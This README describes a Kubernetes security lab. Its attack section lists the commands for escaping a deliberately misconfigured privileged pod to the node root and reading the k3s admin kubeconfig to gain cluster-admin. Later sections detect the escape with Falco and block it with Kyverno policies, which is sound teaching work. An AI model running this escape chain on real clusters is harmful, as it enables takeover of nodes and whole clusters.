# Kubernetes Security Lab

A hands-on container-security lab on a single-node k3s cluster.
Full arc: **land → recon → escape → cluster-admin → detect → prevent.**

---

## Architecture

![Kubernetes Security Lab architecture](k8s_security_lab_architecture.png)

```
ATTACK CHAIN              DETECTION              PREVENTION
─────────────────         ──────────────         ──────────────────
kubectl exec (land)   →   Falco (eBPF)       →   Kyverno ClusterPolicy
ls /host (recon)          syscall probe           block-privileged
chroot /host (escape)     alert: shell in         block-host-pid
KUBECONFIG (pivot)        container               block-hostpath
cluster-admin ✓           Deliverable #2 ✓        pod rejected ✓
Deliverable #1 ✓
```

---

## Environment

| Component | Detail |
|-----------|--------|
| Host OS | Ubuntu Server LTS (VM in VMware) |
| Cluster | k3s single-node (`curl -sfL https://get.k3s.io \| sh -`) |
| Package manager | Helm |
| Namespace | `vuln` |
| Falco | `falcosecurity/falco` chart · `driver.kind=modern_ebpf` |
| Kyverno | `kyverno/kyverno` chart |

---

## Prerequisites

```bash
# k3s
curl -sfL https://get.k3s.io | sh -

# kubeconfig for non-root
mkdir -p ~/.kube
sudo cp /etc/rancher/k3s/k3s.yaml ~/.kube/config
sudo chown $(id -u):$(id -g) ~/.kube/config
echo 'export KUBECONFIG=~/.kube/config' >> ~/.bashrc
export KUBECONFIG=~/.kube/config

# Helm
curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash

# Namespace
kubectl create namespace vuln
```

---

## Phase 1–3 — Attack Chain (Deliverable #1)

### Vulnerable pod manifest (`vuln-pod.yaml`)

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: vuln-pod
  namespace: vuln
spec:
  hostPID: true
  hostNetwork: true
  containers:
    - name: vuln
      image: ubuntu:24.04
      command: ["/bin/sleep", "infinity"]
      securityContext:
        privileged: true
      volumeMounts:
        - name: host-root
          mountPath: /host
  volumes:
    - name: host-root
      hostPath:
        path: /
        type: Directory
```

```bash
kubectl apply -f vuln-pod.yaml
```

### Escape chain

```bash
# 1. Land
kubectl exec -it vuln-pod -n vuln -- /bin/bash

# 2. Recon — confirm hostPath mount exposed node root
ls /host

# 3. Escape — chroot into node root via privileged + mount
chroot /host /bin/bash

# 4. Confirm escape
hostname            # shows node hostname, not container ID

# 5. Pivot to cluster-admin
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
kubectl get nodes
kubectl auth can-i '*' '*' --all-namespaces   # → yes
```

### Why it worked — 3 stacking misconfigs

| Misconfiguration | Role |
|------------------|------|
| `privileged: true` | Grants caps needed to chroot |
| `hostPath: /` | Exposes node's entire root filesystem at `/host` |
| `hostPID: true` | Full visibility into host process tree |

> **Gotcha:** `cat /proc/1/cgroup` shows `init.scope` even inside the pod because
> `hostPID: true` makes PID 1 inside the pod the host's PID 1.
> Use `cat /proc/self/cgroup` instead — `kubepods` = inside pod, `init.scope` = on host.

---

## Phase 4 — Detection with Falco (Deliverable #2)

```bash
# Install
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update
helm install falco falcosecurity/falco \
  --namespace falco \
  --create-namespace \
  --set driver.kind=modern_ebpf \
  --set tty=true

# Wait for ready
kubectl get pods -n falco -w

# Stream alerts
kubectl logs -n falco -l app.kubernetes.io/name=falco -f
```

Re-run the escape chain. Falco fires:

```
Notice: A shell was spawned in a container with an attached terminal
  evt_type=execve  user=root
  c_exepath=/usr/bin/bash  parent=containerd-shim
  k8s_pod_name=vuln-pod  k8s_ns_name=vuln
  container_image_repository=docker.io/library/ubuntu
  container_image_tag=24.04
```

---

## Phase 5 — Prevention with Kyverno (Deliverable #3)

### Install Kyverno

```bash
helm repo add kyverno https://kyverno.github.io/kyverno/
helm repo update
helm install kyverno kyverno/kyverno \
  --namespace kyverno \
  --create-namespace

kubectl get pods -n kyverno -w
```

### Policy (`block-escape.yaml`)

Start in **Audit**, review, then flip to **Enforce**.

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: block-container-escape
spec:
  validationFailureAction: Enforce
  rules:
    - name: block-privileged
      match:
        resources:
          kinds:
            - Pod
      validate:
        message: "Privileged containers are not allowed."
        pattern:
          spec:
            containers:
              - =(securityContext):
                  =(privileged): false

    - name: block-host-pid
      match:
        resources:
          kinds:
            - Pod
      validate:
        message: "hostPID is not allowed."
        pattern:
          spec:
            =(hostPID): false

    - name: block-hostpath
      match:
        resources:
          kinds:
            - Pod
      validate:
        message: "hostPath volumes are not allowed."
        pattern:
          spec:
            =(volumes):
              - =(hostPath): null
```

```bash
# Apply in Audit first
sed -i 's/Enforce/Audit/' block-escape.yaml
kubectl apply -f block-escape.yaml
kubectl get clusterpolicy

# Try the bad pod — allowed but logged
kubectl apply -f vuln-pod.yaml

# Check audit report
kubectl get policyreport -A
kubectl describe policyreport -A

# Flip to Enforce
sed -i 's/Audit/Enforce/' block-escape.yaml
kubectl apply -f block-escape.yaml

# Delete and re-apply — should be REJECTED
kubectl delete pod vuln-pod -n vuln
kubectl apply -f vuln-pod.yaml
```

Expected rejection:

```
Error from server: error when creating "vuln-pod.yaml":
  admission webhook "validate.kyverno.svc-fail" denied the request:
  resource Pod/vuln/vuln-pod was blocked due to the following policies

  block-container-escape:
    block-host-pid:    validation error: hostPID is not allowed.
    block-hostpath:    validation error: hostPath volumes are not allowed.
    block-privileged:  validation error: Privileged containers are not allowed.
```

---

## Phase 6 (Optional) — Trivy Operator

Continuous vulnerability and misconfiguration scanning across the cluster.

```bash
helm repo add aqua https://aquasecurity.github.io/helm-charts/
helm repo update
helm install trivy-operator aqua/trivy-operator \
  --namespace trivy-system \
  --create-namespace

# Check results
kubectl get vulnerabilityreports -A
kubectl get configauditreports -A
```

---

## Deliverables Summary

| # | Phase | What it proved |
|---|-------|----------------|
| 1 | Attack chain | `privileged` + `hostPID` + `hostPath:/` = pod → node root → cluster-admin |
| 2 | Falco detection | Shell spawn in vuln-pod detected in real time via eBPF syscall tracing |
| 3 | Kyverno prevention | All 3 misconfigs blocked at admission — pod rejected before it ever runs |

---

## Gotchas

- `/proc/1/cgroup` is unreliable inside a `hostPID:true` pod — use `/proc/self/cgroup`
- `hostNetwork:true` makes the pod inherit the host hostname — `hostname` alone can't tell inside from outside
- `lsb_release` may be missing — use `cat /etc/os-release`
- Backslash line continuations in multi-line `helm install` commands can break on paste — use single-line form
- YAML typos (`resouces` vs `resources`) cause silent `BadRequest` from Kyverno webhook
